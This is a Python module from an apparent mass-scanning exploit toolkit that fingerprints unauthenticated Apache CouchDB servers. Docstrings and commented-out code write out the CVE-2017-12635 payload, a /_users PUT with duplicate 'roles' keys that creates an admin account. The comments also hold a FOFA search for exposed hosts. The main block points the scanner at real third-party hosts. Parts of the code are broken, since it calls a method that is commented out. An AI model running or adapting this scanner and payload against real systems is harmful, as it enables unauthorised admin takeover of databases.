# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-08-27 18:36
import re
from urllib.parse import urlparse

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.request.asynchttp import *


# fofa: app="APACHE-CouchDB" && country="CN"
# python batch.py -m exploit.web.Unauth.Couchdb.Unauth -cs -fs "app=\"APACHE-CouchDB\""


class Script(BaseScript):
    name = 'Couchdb'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.UNAUTH and BugType.BYPASSPERMISSION
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = [':5984/_config', '/_config']
        # exec
        # self.execPathList = ['/_users/org.couchdb.user:vulhub']
        # self.pathList = {
        #     'detectPath': ['/favicon.ico'],
        #     'execPath': {'CVE-2017-12635': ['/_users/org.couchdb.user:vulhub']}
        # }
        # session
        self.session = session
        # 相关信息
        self.info = ''

    async def detect(self):
        try:
            urlLen = len(f'http://{self.target}'.split(':'))
            if urlLen == 2:
                url = f'http://{self.target}{self.detectPathList[0]}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{self.detectPathList[0]}'
            elif urlLen == 3:
                url = f'http://{self.target}{self.detectPathList[1]}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{self.detectPathList[1]}'
            async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                if response is not None and response.status == 200:
                    text = await response.text()
                    await asyncio.sleep(2)
                    if 'couch' in text or '{"error":"unauthorized","reason":"Authentication required."}' in text:
                        self.flag = True
                        tqdm.write(Fore.RED + '[{}] {}'.format('Couchdb Finger/Unauth', url))
                        return {'name': 'Couchdb Finger/Unauth', 'url': url, 'software': 'Couchdb'}
        except Exception:
            return None

    async def bypassPermission(self):
        '''
        PUT /_users/org.couchdb.user:chacha HTTP/1.1
        Host: your-ip:5984
        Accept: */*
        Accept-Language: en
        User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
        Connection: close
        Content-Type: application/json
        Content-Length: 90

        {
          "type": "user",
          "name": "vulhub",
          "roles": ["_admin"],
          "password": "vulhub"
        }
        '''
        '''
        PUT /_users/org.couchdb.user:chacha HTTP/1.1
        Host: your-ip:5984
        Accept: */*
        Accept-Language: en
        User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
        Connection: close
        Content-Type: application/json
        Content-Length: 108

        {
          "type": "user",
          "name": "vulhub",
          "roles": ["_admin"],
          "roles": [],
          "password": "vulhub"
        }
        '''

    # async def exec(self):
    #     try:
    #         headers = self.headers.copy()
    #         headers.update({'Content-Type': 'application/json'})
    #         async with aiohttp.ClientSession() as session:
    #             for execPath in self.execPathList:
    #                 url = f'http://{self.target}{execPath}' if self.target.startswith(
    #                     ('http:', 'https:')) is False else f'{self.target}{execPath}'
    #                 data = {
    #                     "type": "user",
    #                     "name": "vulhub",
    #                     "roles": ["_admin"],
    #                     "password": "vulhub"
    #                 }
    #                 async with session.put(url=url, data=data, headers=headers, timeout=self.reqTimeout, verify_ssl=False) as response:
    #                     if response is not None:
    #                         await asyncio.sleep(2)
    #                         data = {
    #                                 "type": "user",
    #                                 "name": "vulhub",
    #                                 "roles": ["_admin"],
    #                                 "roles": [],
    #                                 "password": "vulhub"
    #                         }
    #                         async with session.put(url=url, data=data, headers=headers, timeout=self.reqTimeout,
    #                                                verify_ssl=False) as response1:
    #                             if response1 is not None:
    #                                 tqdm.write(Fore.RED + '[{}] {}'.format('Couchdb Unauth', url))
    #                                 self.vulList.append({'name': 'Couchdb Unauth', 'url': url, 'software': 'Couchdb'})
    #     except Exception:
    #         return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    # import requests
    # import hashlib
    #
    # resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)
    #
    semaphore = asyncio.Semaphore(500)
    sc = Script('www.baidu.com', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
